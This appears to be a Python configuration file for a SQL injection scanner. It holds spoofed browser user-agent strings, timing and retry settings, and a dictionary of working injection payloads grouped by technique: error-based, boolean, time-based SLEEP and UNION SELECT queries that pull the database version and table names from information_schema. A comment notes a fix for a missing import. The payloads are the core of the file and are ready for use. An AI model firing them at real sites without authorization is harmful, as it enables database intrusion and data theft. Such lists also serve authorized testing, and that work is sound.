USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

PAYLOADS = {
    "error": [
        "'", "''", "1' OR '1'='1",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ],
    "boolean": [
        "1' AND 1=1 --", "1' AND 1=2 --"
    ],
    "time": [
        "1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--"
    ],
    "union": [
        "1' UNION SELECT VERSION(),null--",
        "1' UNION SELECT NULL,table_name FROM information_schema.tables--"
    ]
}

TIMEOUT = 12
DELAY = 1
MAX_RETRIES = 3          # ✅ Fix: utils.py import karta tha lekin yahan define nahi tha
